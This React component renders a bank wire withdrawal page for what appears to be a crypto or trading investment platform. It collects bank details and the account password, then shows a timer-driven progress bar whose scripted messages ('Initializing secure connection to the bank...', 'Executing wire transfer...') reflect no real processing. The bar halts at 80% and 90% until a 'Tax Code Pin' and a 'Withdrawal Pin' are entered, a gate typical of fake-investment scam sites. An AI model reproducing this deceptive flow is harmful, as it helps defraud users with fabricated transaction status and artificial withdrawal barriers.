/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react/no-unescaped-entities */
"use client";
import Image from "next/image";
import Link from "next/link";
import React, { useEffect, useState } from "react";
import { countryList } from "../../main/AuthUi/countries";
import { ScrollArea } from "../../ui/scroll-area";
import { useUserData } from "../../../contexts/userrContext";
import { InfinitySpin } from "react-loader-spinner";
import axios from "axios";
import toast from "react-hot-toast";
import { toast as t, ToastContainer } from "react-toastify";
import { useTheme } from "../../../contexts/themeContext";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTrigger,
} from "../../ui/dialog";
import {
  Select,
  SelectContent,
  SelectGroup,
  SelectItem,
  SelectLabel,
  SelectTrigger,
  SelectValue,
} from "../../ui/select";
import { DialogClose } from "@radix-ui/react-dialog";
import { useDropzone } from "react-dropzone";

export default function BankWire() {
  const { details, setDetails, setNotification, address } = useUserData();
  const { email } = useUserData();
  const initialFormData = {
    bankName: "",
    accountName: "",
    accountNo: "",
    swissCode: "",
    city: "",
    zipCode: "",
    amount: "",
    password: "",
  };

  const initialFormErrors = {
    bankName: "",
    accountName: "",
    accountNo: "",
    swissCode: "",
    city: "",
    zipCode: "",
    amount: "",
    password: "",
  };

  const [formData, setFormData] = useState(initialFormData);
  const [formErrors, setFormErrors] = useState(initialFormErrors);
  const [isProgressing, setIsProgressing] = useState(false);
  const [progressMessage, setProgressMessage] = useState("");
  const [taxCodePin, setTaxCodePin] = useState("");
  const [WithdrawalPin, setWithdrawalPin] = useState("");
  const [progress, setProgress] = useState(0);
  const [loading, setLoading] = useState(false);
  const [WtPinError, setWtPinError] = useState("");
  const [taxCodePinError, setTaxCodePinError] = useState("");
  const [waitingForPin, setWaitingForPin] = useState(false);
  const [showSucces, setSuccess] = useState(false);
  const tradeBonus = Number(details.tradingBalance) + Number(details.planBonus);
  const [formSubmitted, setFormSubmitted] = useState(false);

  const { selectedMethod, setSelectedMethod } = useUserData();
  const [isCopied, setIsCopied] = useState(false);
  const [selectedAddress, setSelectedAddress] = useState("");
  const [isUploading, setIsUploading] = useState(false);
  const [uploadedImageUrls, setUploadedImageUrls] = useState();
  const [uploadSuccess, setUploadSuccess] = useState(false);
  const [files, setFiles] = useState([]);

  const handleToast = () => {
    t.warn(` Withdrawal of $${formData.amount} under review`, {
      position: "top-center",
      autoClose: 50000,
      style: {
        borderRadius: "8px",
        width: "70%",
        padding: "10px",
        fontSize: "14px",
        margin: "10px auto",
        backgroundColor: "white",
        color: "#00050",
        textAlign: "center",
      },
      hideProgressBar: true,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      theme: "light",
    });
  };

  const sendWithdrawHistory = async () => {
    setLoading(true);
    try {
      const response = await axios.post("/history/withdraw/api", {
        email,
        withdrawMethod: "Bank Wire",
        amount: formData.amount,
        transactionStatus: "Pending",
      });
      if (response.data.success) {
        setDetails((prevDeets) => ({
          ...prevDeets,
          withdrawalHistory: [
            ...prevDeets.withdrawalHistory,
            {
              id: response.data.id,
              withdrawMethod: "Bank Wire",
              amount: formData.amount,
              transactionStatus: "Pending",
              dateAdded: response.data.date,
            },
          ],
        }));
        setNotification(
          `Withdrawal of $${formData.amount} under review`,
          "transaction",
          "pending"
        );
        setLoading(false);
        handleToast();
        setFormData(initialFormData);
        //dosmothing
      }
    } catch (error) {
      console.log("Error adding withdrawal history:", error);
      setLoading(false);
    }
  };

  useEffect(() => {
    const updateProgress = () => {
      setProgress((prevProgress) => {
        const newProgress = prevProgress + 0.5;
        if (newProgress >= 80 && !taxCodePin) {
          setWaitingForPin(true);
          return 80;
        } else if (newProgress >= 90 && !WithdrawalPin) {
          setWaitingForPin(true);
          return 90;
        } else if (newProgress >= 100) {
          sendWithdrawHistory();
          setSuccess(true);
          return 100;
        }
        return newProgress;
      });
    };

    if (isProgressing) {
      const interval = setInterval(() => {
        if (progress < 100 && !waitingForPin) {
          updateProgress();
          updateProgressMessage(progress);
        }
      }, 100); // Update every 0.1 seconds

      return () => clearInterval(interval);
    }
  }, [isProgressing, progress, waitingForPin, taxCodePin, WithdrawalPin]);
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };
  const updateProgressMessage = (currentProgress) => {
    if (currentProgress >= 0 && currentProgress < 10) {
      setProgressMessage("Initializing secure connection to the bank...");
    } else if (currentProgress >= 10 && currentProgress < 20) {
      setProgressMessage("Validating user credentials...");
    } else if (currentProgress >= 20 && currentProgress < 30) {
      setProgressMessage("Retrieving account details...");
    } else if (currentProgress >= 30 && currentProgress < 40) {
      setProgressMessage("Verifying available funds...");
    } else if (currentProgress >= 40 && currentProgress < 50) {
      setProgressMessage("Preparing transaction details...");
    } else if (currentProgress >= 50 && currentProgress < 60) {
      setProgressMessage("Confirming recipient's banking information...");
    } else if (currentProgress >= 60 && currentProgress < 70) {
      setProgressMessage(
        "Processing transaction with financial institution..."
      );
    } else if (currentProgress >= 70 && currentProgress < 80) {
      setProgressMessage("Complying with international wire regulations...");
    } else if (currentProgress >= 80 && currentProgress < 90) {
      setProgressMessage("Finalizing wire transfer details...");
    } else if (currentProgress >= 90 && currentProgress < 100) {
      setProgressMessage("Executing wire transfer...");
    } else if (currentProgress >= 100) {
      setProgressMessage("Transaction successful. Funds transferred.");
    }
  };

  const handlePinChange = (e) => {
    setTaxCodePin(e.target.value);
  };
  const handleWTPinChange = (e) => {
    setWithdrawalPin(e.target.value);
  };
  async function loginUser(email, password) {
    const errors = {};
    setLoading(true);
    try {
      const response = await axios.post("/withdrawals/verifypw/api", {
        email,
        password,
      });

      if (response.data.success) {
        // Perform action when login is successful
        // toast.success("Pin Correct");
        sendWithdrawHistory();

        // setIsProgressing(true);
        setFormSubmitted(true);
        setLoading(false);
      } else {
        setLoading(false);
        errors.password = "Incorrect! Check password and try again";
        // Perform action when login fails
      }
    } catch (error) {
      // Handle any error that occurs during the request
      console.log("An error occurred:", error.message);
    }
    setFormErrors(errors);
  }
  async function loginUser1(email, taxCodePin) {
    setLoading(true);
    try {
      const response = await axios.post("/withdrawals/verifytaxcode/api", {
        email,
        taxCodePin,
      });

      if (response.data.success) {
        // Perform action when login is successful
        toast.success("Pin Correct");
        setWaitingForPin(false);
        setLoading(false);
      } else {
        setLoading(false);
        setTaxCodePinError("Incorrect! Check tax code and try again");
        // Perform action when login fails
      }
    } catch (error) {
      // Handle any error that occurs during the request
      console.log("An error occurred:", error.message);
    }
  }
  async function loginUser2(email, withdrawalPin) {
    setLoading(true);
    try {
      const response = await axios.post("/withdrawals/verifywithdrawpin/api", {
        email,
        withdrawalPin,
      });

      if (response.data.success) {
        // Perform action when login is successful
        setWaitingForPin(false);
        setLoading(false);
      } else {
        setLoading(false);
        setWtPinError("Incorrect! Check password and try again");
        // Perform action when login fails
      }
    } catch (error) {
      // Handle any error that occurs during the request
      console.log("An error occurred:", error.message);
    }
  }
  const handlePinSubmit = (e) => {
    e.preventDefault();
    if (taxCodePin.length >= 6) {
      setTaxCodePinError(""); // Clear any previous errors
      loginUser1(email, taxCodePin);
      // You can add logic here to handle the form submission
    } else {
      setTaxCodePinError("Tax Code Pin must be at least 6 characters");
    }
  };
  const handleWTPinSubmit = (e) => {
    e.preventDefault();
    if (WithdrawalPin.length >= 4) {
      setWtPinError(""); // Clear any previous errors
      loginUser2(email, WithdrawalPin);
      // You can add logic here to handle the form submission
    } else {
      setWtPinError("Withdrawal Pin must be at least 4 characters");
    }
  };
  const handleSubmit = (e) => {
    e.preventDefault();

    // Validate form fields
    const errors = {};

    for (const field in formData) {
      if (formData[field] === "") {
        errors[field] = `${
          field.charAt(0).toUpperCase() + field.slice(1)
        } is required`;
      }
    }
    if (formData.amount <= 0) errors.amount = "Enter a valid amount";
    if (formData.password.length < 6) {
      errors.password = "Password should be at least 6 characters long";
    }
    if (formData.amount > tradeBonus)
      errors.amount =
        "Insufficient Balance, your withdrawable balance is $" +
        tradeBonus.toLocaleString();

    if (Object.keys(errors).length > 0) {
      setFormErrors(errors);
      return;
    }
    loginUser(email, formData.password);
    // Form submission logic here
    // ...
  };
  const { isDarkMode, baseColor } = useTheme();

  const deposits = [
    {
      coinName: "Bitcoin",
      short: "Bitcoin",
      image: "/assets/bitcoin.webp",
      address: address && address.Bitcoin,
    },
    {
      coinName: "Ethereum",
      short: "Ethereum",
      image: "/assets/ethereum.webp",
      address: address && address.Ethereum,
    },
    {
      coinName: "Tether USDT",
      short: "Tether",
      image: "/assets/Tether.webp",
      address: address && address.Tether,
    },
  ];
  const othermeans = [
    {
      coinName: "Binance",
      short: "binance",
      image: "/assets/bnb.webp",
      address: address && address.Binance,
    },
    {
      coinName: "Dogecoin",
      short: "Dogecoin",
      image: "/assets/dogecoin.webp",
      address: address && address.Dogecoin,
    },
    {
      coinName: "Tron",
      short: "Tron",
      image: "/assets/tron-logo.webp",
      address: address && address.Tron,
    },
  ];
  const handleMethodChange = (value) => {
    setSelectedMethod(value);
    const selectedOption = [...deposits, ...othermeans].find(
      (option) => option.short === value
    );
    setSelectedAddress(selectedOption?.address || "");
  };
  const { getRootProps, getInputProps } = useDropzone({
    accept: "image/jpeg, image/png, image/jpg",
    onDrop: async (acceptedFiles) => {
      setIsUploading(true); // Set loading state

      try {
        const uploadedImageUrls = await Promise.all(
          acceptedFiles.map(async (file) => {
            const formData = new FormData();
            formData.append("file", file);
            formData.append("upload_preset", "insightstakers");
            try {
              const response = await axios.post(
                `https://api.cloudinary.com/v1_1/dr1p2iupg/upload`, // Replace with your Cloudinary URL
                formData
              );
              setUploadedImageUrls(response.data.secure_url);
              return response.data.secure_url;
            } catch (error) {
              console.error("Error uploading image to Cloudinary:", error);
              throw error;
            }
          })
        );

        // Store uploaded image URLs

        setFiles(
          acceptedFiles.map((file, index) => ({
            ...file,
            preview: URL.createObjectURL(file),
            cloudinaryUrl: uploadedImageUrls[index], // Store the Cloudinary URL
          }))
        );

        setUploadSuccess(true); // Set success state
      } catch (error) {
        console.error("Error uploading images to Cloudinary:", error);
      } finally {
        setIsUploading(false); // Reset loading state
      }
    },
  });
  const handleCopyAddress = () => {
    navigator.clipboard.writeText(selectedAddress);
    setIsCopied(true);
    toast.success("Address copied");
    setTimeout(() => {
      setIsCopied(false);
    }, 2000);
  };

  return (
    <>
      <ToastContainer />
      {!isProgressing && (
        <>
          <div className="bitcoin-payment image-cont">
            <Image
              alt=""
              src="/assets/bankwire.png"
              width={1000}
              height={1000}
              className="md:w-1/2 w-full mx-auto"
            />
          </div>
          <div className="bitcoin-payment-form p-4">
            <form onSubmit={handleSubmit}>
              {/* Bank Location */}
              <div className="mb-3 mt-3">
                <label
                  className={`font-bold text-sm py-3 mb-2 ${
                    isDarkMode ? "text-white/80" : ""
                  }`}
                >
                  Select Your Bank Location
                </label>
                {/* <input
                  type="text"
                  id="bankLocation"
                  name="bankLocation"
                  placeholder="United States of America"
                  value={formData.bankLocation}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 text-xs placeholder:text-muted-foreground rounded-lg bg-gry-50 font-bold focus:outline-none ${
                    formErrors.bankLocation ? "border-red-500 border" : "border"
                  }`}
                /> */}
                <Select defaultValue="United States" className="outline-none">
                  <SelectTrigger
                    className={`outline-none font-bold ${
                      isDarkMode ? "bg-[#111] text-white border-0" : ""
                    }`}
                  >
                    <SelectValue placeholder="Select country" />
                  </SelectTrigger>
                  <SelectContent
                    className={`font-bold ${
                      isDarkMode ? "bg-[#222] text-white border-0" : ""
                    }`}
                  >
                    <ScrollArea className="h-[300px]">
                      {countryList.map((list) => (
                        <SelectItem key={list.label} value={list.label}>
                          {list.label}
                        </SelectItem>
                      ))}
                    </ScrollArea>
                  </SelectContent>
                </Select>
              </div>

              {/* Bank Name */}
              <div className="mb-3">
                <label
                  htmlFor="bankName"
                  className={`font-bold text-sm py-3 ${
                    isDarkMode ? "text-white/90" : ""
                  }`}
                >
                  Bank Name
                </label>
                <input
                  type="text"
                  id="bankName"
                  name="bankName"
                  placeholder="Bank Name"
                  value={formData.bankName}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 text-xs placeholder:text-muted-foreground rounded-md ${
                    isDarkMode ? "bg-[#111] text-white" : ""
                  } bg-gry-50 font-bold focus:outline-none ${
                    formErrors.bankName ? "border-red-500 border" : ""
                  }`}
                />
                {formErrors.bankName && (
                  <p className="text-red-500 text-xs mt-1">
                    {formErrors.bankName}
                  </p>
                )}
              </div>

              {/* Account Name */}
              <div className="mb-3">
                <label
                  htmlFor="accountName"
                  className={`font-bold text-sm py-3 ${
                    isDarkMode ? "text-white/90" : ""
                  }`}
                >
                  Account Name
                </label>
                <input
                  type="text"
                  id="accountName"
                  name="accountName"
                  placeholder="Account Name"
                  value={formData.accountName}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 text-xs placeholder:text-muted-foreground  rounded-md ${
                    isDarkMode ? "bg-[#111] text-white" : ""
                  } bg-gry-50 font-bold focus:outline-none ${
                    formErrors.accountName ? "border-red-500 border" : ""
                  }`}
                />
                {formErrors.accountName && (
                  <p className="text-red-500 text-xs mt-1">
                    {formErrors.accountName}
                  </p>
                )}
              </div>

              {/* Account No */}
              <div className="mb-3">
                <label
                  htmlFor="accountNo"
                  className={`font-bold text-sm py-3 ${
                    isDarkMode ? "text-white/90" : ""
                  }`}
                >
                  Account No
                </label>
                <input
                  type="text"
                  id="accountNo"
                  name="accountNo"
                  placeholder="Account No"
                  value={formData.accountNo}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 text-xs placeholder:text-muted-foreground rounded-md ${
                    isDarkMode ? "bg-[#111] text-white" : ""
                  } bg-gry-50 font-bold focus:outline-none ${
                    formErrors.accountNo ? "border-red-500 border" : ""
                  }`}
                />
                {formErrors.accountNo && (
                  <p className="text-red-500 text-xs mt-1">
                    {formErrors.accountNo}
                  </p>
                )}
              </div>

              {/* Swiss Code */}
              <div className="mb-3">
                <label
                  htmlFor="swissCode"
                  className={`font-bold text-sm py-3 ${
                    isDarkMode ? "text-white/90" : ""
                  }`}
                >
                  Swiss Code
                </label>
                <input
                  type="text"
                  id="swissCode"
                  name="swissCode"
                  //min={11}
                  placeholder="Your Bank Swiss Code"
                  value={formData.swissCode}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 text-xs placeholder:text-muted-foreground  rounded-md ${
                    isDarkMode ? "bg-[#111] text-white" : ""
                  } bg-gry-50 font-bold focus:outline-none ${
                    formErrors.swissCode ? "border-red-500 border" : ""
                  }`}
                />

                {formErrors.swissCode && (
                  <p className="text-red-500 text-xs mt-1">
                    {formErrors.swissCode}
                  </p>
                )}
                <p
                  className={`text-xs text-muted-foreground my-1 mt-2  border p-3 font-old rounded-md ${
                    isDarkMode ? "bg-[#111] border-white/20" : "bg-slate-50"
                  }`}
                >
                  <strong className="font-bold">
                    The Swift Code (Or "BIC Code"){" "}
                  </strong>{" "}
                  Is An 8-11 Alphanumeric Code Used To Send Money Via Wire
                  Transfer. If You don't Know Your Swiss Code Please Contact
                  Your Bank.
                </p>
              </div>

              {/* City */}
              <div className="mb-3">
                <label
                  htmlFor="city"
                  className={`font-bold text-sm py-3 ${
                    isDarkMode ? "text-white/90" : ""
                  }`}
                >
                  City
                </label>
                <input
                  type="text"
                  id="city"
                  name="city"
                  placeholder="Precise Location Of Bank"
                  value={formData.city}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 text-xs placeholder:text-muted-foreground rounded-md ${
                    isDarkMode ? "bg-[#111] text-white" : ""
                  } bg-gry-50 font-bold focus:outline-none ${
                    formErrors.city ? "border-red-500 border" : ""
                  }`}
                />
                {formErrors.city && (
                  <p className="text-red-500 text-xs mt-1">{formErrors.city}</p>
                )}
              </div>

              {/* Postal Code */}
              <div className="mb-3">
                <label
                  htmlFor="zipCode"
                  className={`font-bold text-sm py-3 ${
                    isDarkMode ? "text-white/90" : ""
                  }`}
                >
                  Postal Code
                </label>
                <input
                  type="number"
                  id="zipCode"
                  name="zipCode"
                  placeholder="Zip Code / Postal Code"
                  value={formData.zipCode}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 text-xs placeholder:text-muted-foreground  rounded-md ${
                    isDarkMode ? "bg-[#111] text-white" : ""
                  }g bg-gry-50 font-bold focus:outline-none ${
                    formErrors.zipCode ? "border-red-500 border" : ""
                  }`}
                />
                {formErrors.zipCode && (
                  <p className="text-red-500 text-xs mt-1">
                    {formErrors.zipCode}
                  </p>
                )}
              </div>

              {/* Amount */}
              <div className="mb-3">
                <label
                  htmlFor="amount"
                  className={`font-bold text-sm py-3 ${
                    isDarkMode ? "text-white/90" : ""
                  }`}
                >
                  Amount to withdraw (USD)
                </label>
                <input
                  type="number"
                  id="amount"
                  name="amount"
                  placeholder="Enter Amount"
                  value={formData.amount}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 text-xs placeholder:text-muted-foreground  rounded-md ${
                    isDarkMode ? "bg-[#111] text-white" : ""
                  } bg-gry-50 font-bold focus:outline-none ${
                    formErrors.amount ? "border-red-500 border" : ""
                  }`}
                />
                {formErrors.amount && (
                  <p className="text-red-500 text-xs mt-1">
                    {formErrors.amount}
                  </p>
                )}
              </div>

              {/* Password */}
              <div className="mb-3">
                <label
                  htmlFor="password"
                  className={`font-bold text-sm py-3 ${
                    isDarkMode ? "text-white/90" : ""
                  }`}
                >
                  Password Verification
                </label>
                <input
                  type="password"
                  id="password"
                  name="password"
                  placeholder="Enter Password"
                  value={formData.password}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 text-xs placeholder:text-muted-foreground rounded-md ${
                    isDarkMode ? "bg-[#111] text-white" : ""
                  } bg-gry-50 font-bold focus:outline-none ${
                    formErrors.password ? "border-red-500 border" : ""
                  }`}
                />
                {formErrors.password && (
                  <p className="text-red-500 text-xs mt-1">
                    {formErrors.password}
                  </p>
                )}
              </div>

              <button
                disabled={loading}
                type="submit"
                className="w-full  px-4 mt-4 text-sm rounded-lg flex items-center justify-center bg-[#00a055] text-white font-bold hover:bg-blue-600 focus:outline-none focus:bg-blue-600"
              >
                {loading ? (
                  <InfinitySpin width="100" color="#ffffff" />
                ) : (
                  <div className="py-3">Transfer using Wire</div>
                )}
              </button>
            </form>
          </div>
        </>
      )}

      {isProgressing && !showSucces && (
        <div className="py-20">
          <div className="flex w-full justify-center items-center ">
            <div className="progress-cont w-full px-5 md:px-14">
              <div
                className={`${
                  isDarkMode ? "text-white/90" : ""
                } progress-messages text-sm font-bold mb-1 flex items-center justify-between`}
              >
                <div>{progressMessage}</div>
                <div className="percentage font-bold text-sm">
                  {progress.toFixed()}%
                </div>
              </div>
              <div className="progress-movements w-full">
                <div
                  className={`${
                    isDarkMode ? "bg-blue-500/10" : "bg-blue-50"
                  } holder w-full h-2 relative overflow-hidden rounded-full `}
                >
                  <div
                    className={`mover absolute h-full rounded-full transition-all bg-blue-600`}
                    style={{ width: `${progress}%` }}
                  ></div>
                </div>
              </div>
            </div>
          </div>

          {progress >= 80 && progress < 90 && waitingForPin && (
            <div className="tax-code-form px-5 md:px-14 mt-8">
              <form onSubmit={handlePinSubmit}>
                <input
                  type="text"
                  id="taxCodePin"
                  name="taxCodePin"
                  placeholder="Enter Tax Code Pin"
                  value={taxCodePin}
                  onChange={handlePinChange}
                  className={`w-full px-4 py-3 text-xs ${
                    isDarkMode
                      ? "bg-[#111] border-0 /border-muted-foreground text-white"
                      : ""
                  } placeholder:text-muted-foreground rounded-md bg-gry-50 font-bold focus:outline-none border ${
                    taxCodePinError ? "border-red-500" : ""
                  }`}
                />
                {taxCodePinError && (
                  <p className="text-red-500 text-xs mt-1">{taxCodePinError}</p>
                )}
                <button
                  type="submit"
                  className="bg-blue-600 py- flex items-center  justify-center mt-2 w-full rounded-lg text-sm text-white font-bold"
                >
                  {loading ? (
                    <InfinitySpin width="100" color="#ffffff" />
                  ) : (
                    <div className="py-3">Continue withdrawal</div>
                  )}
                </button>
              </form>
            </div>
          )}
          {progress >= 90 && waitingForPin && (
            <div className="tax-code-form px-5 md:px-14 mt-8">
              <form onSubmit={handleWTPinSubmit}>
                <input
                  type="text"
                  id="WithdrawalPin"
                  name="WithdrawalPin"
                  placeholder="Enter Withdrawal Pin"
                  value={WithdrawalPin}
                  onChange={handleWTPinChange}
                  className={`w-full px-4 py-3  ${
                    isDarkMode
                      ? "bg-[#111] border-0 /border-muted-foreground text-white"
                      : ""
                  }  text-xs placeholder:text-muted-foreground rounded-lg bg-gry-50 font-bold focus:outline-none border ${
                    WtPinError ? "border-red-500" : ""
                  }`}
                />
                {WtPinError && (
                  <p className="text-red-500 font-bold text-xs mt-1">
                    {WtPinError}
                  </p>
                )}
                <button
                  disabled={loading}
                  type="submit"
                  className="bg-blue-600 flex justify-center items-center py- mt-2 w-full rounded-lg text-sm text-white font-bold"
                >
                  {loading ? (
                    <InfinitySpin width="100" color="#ffffff" />
                  ) : (
                    <div className="py-3">Finalize Withdrawal</div>
                  )}
                </button>
              </form>
            </div>
          )}
        </div>
      )}
      {showSucces && (
        <div
          className={`flex flex-col justify-center items-center px-5 md:px-14 mt-8 py-10 /bg-white rounded-lg ${
            isDarkMode ? "textwhite border border-white/10" : ""
          }`}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 20 20"
            fill="currentColor"
            className={`w-16 h-16 mx-auto mb-4 ${
              isDarkMode ? "text-white/50" : "text-black/40"
            }`}
          >
            <path
              fillRule="evenodd"
              d="M16.403 12.652a3 3 0 000-5.304 3 3 0 00-3.75-3.751 3 3 0 00-5.305 0 3 3 0 00-3.751 3.75 3 3 0 000 5.305 3 3 0 003.75 3.751 3 3 0 005.305 0 3 3 0 003.751-3.75zm-2.546-4.46a.75.75 0 00-1.214-.883l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z"
              clipRule="evenodd"
            />
          </svg>
          <h1 className="text-xl font-bold mb-2">Withdrawal Successful</h1>
          <p
            className={` mb-6 text-center text-sm px-5 md:px-20 lg:px-32 ${
              isDarkMode ? "text-white/80" : "text-muted-foreground"
            }`}
          >
            Your bank wire withdrawal has been successfully processed. Please
            allow up to 5 business days for the funds to be reflected in your
            account. You can review the transaction details in your transaction
            history. If you require any further assistance, don't hesitate to
            contact us
          </p>
          <Link href="/dashboard" passHref>
            {" "}
            <button className="bg-[#00a055] py-3 px-10 rounded-lg text-sm text-white font-bold hover:bg-slate-600 transition-all focus:outline-none">
              Back to Dashboard
            </button>
          </Link>
        </div>
      )}
    </>
  );
}
